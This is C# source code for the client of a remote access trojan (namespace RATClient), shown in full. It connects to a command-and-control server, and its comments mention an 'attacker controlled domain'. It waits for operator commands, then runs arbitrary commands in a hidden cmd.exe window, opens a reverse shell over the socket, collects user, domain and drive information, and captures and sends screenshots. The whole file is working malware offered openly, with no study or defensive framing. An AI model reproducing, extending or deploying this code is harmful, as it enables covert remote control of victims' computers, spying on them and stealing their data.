using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Net;
using System.Threading;
using System.IO;
using System.Diagnostics;
using System.Drawing.Imaging;
using ScreenShotDemo;
using System.Drawing;

namespace RATClient
{
    class Program
    {
        //static IPAddress CCIP = IPAddress.Parse("192.168.1.1");    //In future, read this from text file or link to attacker controlled domain
        static IPAddress CCIP = Dns.GetHostEntry(Dns.GetHostName()).AddressList[0];
        static IPAddress localIP = Dns.GetHostEntry(Dns.GetHostName()).AddressList[0];
        static IPEndPoint CCServ = new IPEndPoint(CCIP, 5555);
        static Boolean connected = false;
        static Socket openSock;
        static void phoneHome()
        {
            Console.WriteLine("Contacting C&C...");
            byte[] ackBytes = new byte[3];
            Socket phoneHome = new Socket(CCIP.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
            while (true)
            {
                try
                {
                    phoneHome.Connect(CCServ);
                    break;
                }
                catch (Exception e)
                {
                    Console.WriteLine("Connection to CC failed. Retrying...");
                }
            }
            String message = "";
            message += (char)6;
            message += (char)4;
            String recvString = null;
            phoneHome.Send(Encoding.ASCII.GetBytes(message));

            int ackCount = phoneHome.Receive(ackBytes);
            recvString = Encoding.ASCII.GetString(ackBytes, 0, ackCount);
            while (recvString[0] != (char)6) //Keep listening until the first byte recieved is an ACK
            {
                Thread.Sleep(200); //Avoid resource hogging
                ackCount = phoneHome.Receive(ackBytes);
                recvString = Encoding.ASCII.GetString(ackBytes, 0, ackCount);
            }
            connected = true; //We've got a connection!
            openSock = phoneHome;
            idleLoop();
        }

        static void idleLoop()
        {
            Console.WriteLine("Entering idle loop...");
            while (true)
            {
                byte[] recvBytes = new byte[1024];
                Thread.Sleep(200); //Avoid resource hogging
                int byteCount = 0;
                try
                {
                    byteCount = openSock.Receive(recvBytes);
                }catch(Exception e)
                {
                    Console.WriteLine("Something's gone wrong. {0} Phoning home...",e.ToString());
                    phoneHome();
                }
                
                string recvString = Encoding.ASCII.GetString(recvBytes,0,byteCount);
                if (recvString.Trim() != null)
                {
                    receptionProcessing(recvString);
                }
                
            }
        }
        static void receptionProcessing(string recvString)
        {
            Console.WriteLine("Entered reception processing for string: {0}", recvString);
            if(recvString.StartsWith("3><3[")) //If the packet leads with 3><3[ (ooh aren't you so h4x0r), process it with exec
            {
                String issuedCommand = recvString.Substring(6);
                issuedCommand = issuedCommand.Substring(0, issuedCommand.Length - 1);
                exec(issuedCommand);
            }else if (recvString.StartsWith("ki||")) //If it's this, process for shutdown
            {
                shutdownProcedure();
            }else if (recvString.StartsWith("rev3rs3")) //if it's that, start a reverse shell
            {
                reverseShell();
            }else if (recvString.StartsWith("inf0")) //if it's this, get system info
            {
                getSystemInfo();
            }else if (recvString.StartsWith("y0ink"))
            {
                sendScreenshot();
            }
        }


        static void reverseShell()
        {
            Console.WriteLine("Spinning up reverse shell...");
            Process shell = new Process();
            shell.StartInfo.RedirectStandardError = true;
            shell.StartInfo.RedirectStandardOutput = true;
            shell.StartInfo.RedirectStandardInput = true;
            shell.StartInfo.UseShellExecute = false;
            shell.StartInfo.FileName = "cmd.exe";
            shell.Start();
            StreamReader stdout = shell.StandardOutput;
            StreamReader stderr = shell.StandardError;
            StreamWriter stdin = shell.StandardInput;
            /*String confirmMessage = "reverseShellStart";
            confirmMessage += (char)4;
            byte[] confirmBytes = Encoding.ASCII.GetBytes(confirmMessage);
            openSock.Send(confirmBytes);*/
            while (true)
            {
                char readchr;
                String output = "";
                while (true)
                {
                    readchr = (char)stdout.Read();
                    if (stdout.Peek() == -1 && readchr == '>')
                    {
                        break;
                    }
                    output += readchr;

                }
                output += (char)4;
                byte[] outputBytes = Encoding.ASCII.GetBytes(output);
                openSock.Send(outputBytes);
                byte[] command = new byte[1024];
                int bytecount = openSock.Receive(command);
                String cmd = Encoding.ASCII.GetString(command, 0, bytecount);
                if (cmd.ToLower() == "exit")
                {
                    shell.Kill();
                    break;
                }
                stdin.WriteLine(cmd);
            }
            Console.WriteLine("Spinning down reverse shell...");
        }
        static void shutdownProcedure()
        {
            packAndSend("Shutdown Confirmed.");
            Environment.Exit(0xdead);
        }
        static void getSystemInfo()
        {
            String outString = "";
            outString += "Executable Location:      "+Environment.CommandLine+"\n";
            outString += "64 bit system?:           " + Environment.Is64BitOperatingSystem + "\n";
            outString += "Version:                  " + Environment.OSVersion + "\n";
            outString += "Domain:                   " + Environment.UserDomainName + "\n";
            outString += "Running as User:          " + Environment.UserName + "\n";
            outString += "Logical Drives:         \n";
            foreach(String drive in Environment.GetLogicalDrives())
            {
                outString += "                          "+drive+"\n";
            }
            packAndSend(outString);
        }
        static void packAndSend(object toSend)
        {
            string sendString = toSend.ToString();
            Console.WriteLine("Pack and send deployed on: {0}", sendString);
            sendString += (char)4; //The pack part of pack and send: Append an EOF byte
            byte[] sendBytes = Encoding.ASCII.GetBytes(sendString);
            openSock.Send(sendBytes);
        }
        static void exec(String command)
        {
            Console.WriteLine("Exec processing command: {0}", command);
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.RedirectStandardOutput = true;
            startInfo.UseShellExecute = false;
            startInfo.Arguments = "/C "+command;
            process.StartInfo = startInfo;
            process.Start();
            String stdOut = process.StandardOutput.ReadToEnd();
            process.WaitForExit();
            //Now that we have that, send it
            Thread execDataThread = new Thread(new ParameterizedThreadStart(packAndSend));
            execDataThread.Start(stdOut);
        }
        static void recvFile()
        {

        }
        static void sendScreenshot()//very very slight memory leak here...
        {
            Console.WriteLine("Running screenshot sender...");
            ScreenCapture sc = new ScreenCapture();
            Image img = sc.CaptureScreen();
            Console.WriteLine("screenshot saved.");
            if(img == null)
            {
                Console.WriteLine("Image is null!");
            }
            ImageConverter imageConverter = new ImageConverter();
            byte[] imageBytes = (byte[])imageConverter.ConvertTo(img, typeof(byte[]));
            Console.WriteLine("Starting screenshot send...");
            openSock.Send(imageBytes);
            Console.WriteLine("Send completed.");
            img.Dispose();
        }
        static void Main(string[] args)
        {
            while (true)
            {
                Thread t = new Thread(phoneHome);
                t.Start();
                Console.ReadLine();
            }
            
        }
    }
}
